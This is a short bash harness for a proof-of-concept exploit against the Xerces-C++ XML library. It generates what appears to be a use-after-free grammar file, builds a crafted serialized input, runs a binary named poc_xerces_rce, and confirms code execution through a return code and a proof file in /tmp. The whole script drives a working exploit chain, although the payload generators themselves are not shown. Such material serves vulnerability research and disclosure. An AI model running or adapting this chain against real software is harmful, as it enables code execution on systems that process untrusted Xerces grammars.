#!/usr/bin/env bash
set -euo pipefail

: "${XERCES_BUILD:?set XERCES_BUILD to the Xerces-C++ build directory}"

export LD_LIBRARY_PATH="$XERCES_BUILD/src${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"

rm -f /tmp/xerces_serialized_rce_proof
rm -f uaf3_grammar.bin final_input.bin

./gen_uaf3 >/dev/null
./build_final_input.py uaf3_grammar.bin ./poc_xerces_rce final_input.bin >/dev/null

set +e
./poc_xerces_rce final_input.bin trigger.xml
rc=$?
set -e

proof=$(cat /tmp/xerces_serialized_rce_proof 2>/dev/null || true)

echo "rc=$rc"
echo "proof=$proof"

if [[ "$rc" == "42" && "$proof" == "xerces-serialized-rce" ]]; then
  echo '[+] code execution proof hit'
  exit 0
fi

echo '[-] proof did not hit'
exit 1
